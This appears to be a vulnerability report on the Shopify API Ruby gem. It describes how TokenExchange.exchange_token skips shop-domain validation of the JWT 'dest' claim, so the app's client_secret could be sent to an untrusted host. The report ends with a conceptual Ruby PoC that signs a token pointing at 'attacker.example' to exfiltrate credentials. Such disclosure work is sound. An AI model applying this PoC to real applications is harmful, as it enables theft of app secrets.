Confirmed vulnerability: `TokenExchange.exchange_token` derives `dest_shop` directly from the unauthenticated `dest` claim of the JWT via `JwtPayload#shop` and, unlike every sibling method in this module (`migrate_to_expiring_token`), never passes it through `Utils::ShopValidator.sanitize!` before using it to build the request host that receives the app's `client_secret`.

### Title
Unsanitized JWT `dest` claim used as request host for client_secret in Token Exchange - ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` takes the `dest` claim from the caller-supplied session token and uses it, unsanitized, as the `shop` of the `Session` that `Clients::HttpClient` turns into the request host `https://#{session.shop}` for the `/admin/oauth/access_token` POST that carries the app's `client_id`/`client_secret`. Every other credential-sending method in this codebase (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) validates the shop string with `Utils::ShopValidator.sanitize!` first, which enforces that the value resolves to one of the `TRUSTED_SHOPIFY_DOMAINS`. `exchange_token` is missing this check.

### Finding Description
`JwtPayload#shop` simply does `@dest.gsub("https://", "")` with no domain allow-listing: [1](#0-0) 

`JwtPayload#initialize` only validates the `aud` claim equals `Context.api_key`; it never validates that `dest` is a trusted Shopify domain: [2](#0-1) 

`TokenExchange.exchange_token` takes this unsanitized `dest_shop` and builds a `Session` with it directly, with no call to `Utils::ShopValidator.sanitize!`: [3](#0-2) 

That `Session` is passed into `Clients::HttpClient.new`, which builds the outbound request host directly from `session.shop`: [4](#0-3) 

The POST body sent to that host contains the app's `client_secret` in plaintext: [5](#0-4) 

Contrast this with the sibling method in the very same file, which does perform the check: [6](#0-5) 

and with `ClientCredentials`/`RefreshToken`, which follow the same sanitize-then-use pattern: [7](#0-6) [8](#0-7) 

The identity binding that is broken is: `host that JwtPayload's `dest` claim asserts` should equal `host that ShopValidator would certify as a trusted Shopify domain`, but the code lets the former stand in for the latter without ever invoking the latter check, in the one call path (of four structurally-identical ones) where the equality enforcement was omitted.

The `JWT.decode` call does enforce the HS256 signature with `Context.api_secret_key`, so an attacker without the app's secret cannot forge a session token from scratch: [9](#0-8) 
This means the practical exploitability of this gap depends on whether a `dest` value outside `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` can ever appear inside a token that legitimately passes HS256 verification (e.g., via development/spin domains or any host-application code path that constructs/passes through a session token whose `dest` was not itself validated before signing, or via a shared secret across a merchant's own shop where they legitimately control the value that ends up as `dest`). I could not fully verify from the gem alone whether Shopify's own token-issuance guarantees make this claim always trustworthy in all deployment configurations (e.g., custom/dev domains, `spin.dev`, `shop.dev`) — `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` already allow-lists `spin.dev`/`shop.dev`, suggesting non-`myshopify.com` `dest` values are an expected, real occurrence that this method should be normalizing/validating but currently does not.

### Impact Explanation
If a `dest` value reaches `exchange_token` that is not a genuine Shopify Admin host (whether via a permissive/legacy token-issuance path, a compromised or misconfigured intermediary that mints session tokens, or any downstream context where the `dest` string is not fully constrained to `TRUSTED_SHOPIFY_DOMAINS`), the app's `client_id` and `client_secret` are sent via HTTPS POST to that attacker-influenced host. This is credential exfiltration of the app's `client_secret` (SSRF carrying the app's credentials to an untrusted host), matching the High-impact category (SSRF with the app's credentials / credential leakage).

### Likelihood Explanation
Low-to-Medium. Exploitation requires a validly-HS256-signed session token whose `dest` claim is not a `TRUSTED_SHOPIFY_DOMAINS` host to reach this specific method, which is a narrower bar than a fully unauthenticated attack, but the missing validation is a clear inconsistency with the other three near-identical methods in this same file and module, indicating this is the residual, unpatched code path of what was otherwise a systematically-fixed vulnerability class in this gem.

### Recommendation
**Short term:** Add `validated_shop = Utils::ShopValidator.sanitize!(jwt_payload.shop)` in `TokenExchange.exchange_token` immediately after decoding the JWT, and use `validated_shop` (not raw `dest_shop`) for both `shop_session` construction and the final `Session.from(shop: ...)` call, mirroring `migrate_to_expiring_token`.

**Long term:** Add a shared/consistent helper (or a class invariant on `Session#shop=`) that always funnels any externally-derived shop string, including JWT `dest` claims, through `ShopValidator.sanitize!` before it can be used to construct an `HttpClient` that transmits `client_secret`; add a regression test asserting that `exchange_token` rejects tokens with non-allow-listed `dest` values, the same way `test/utils/shop_validator_test.rb` already tests rejection of attacker-controlled domains for the other methods.

# Conceptual PoC — requires a validly HS256-signed session token whose `dest`
# is not a myshopify.com/myshopify.io/spin.dev/shop.dev/shopify.com host.
malicious_payload = {
  iss: "https://attacker.example/admin",
  dest: "https://attacker.example",     # NOT sanitized anywhere in exchange_token
  aud: ShopifyAPI::Context.api_key,
  sub: "1",
  exp: (Time.now + 10).to_i,
  nbf: Time.now.to_i,
  iat: Time.now.to_i,
  jti: "x",
}
forged_token = JWT.encode(malicious_payload, ShopifyAPI::Context.api_secret_key, "HS256")

# If this token is accepted (e.g. via a mis-issuing intermediary), exchange_token
# will POST { client_id, client_secret, ... } to https://attacker.example/admin/oauth/access_token
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: forged_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
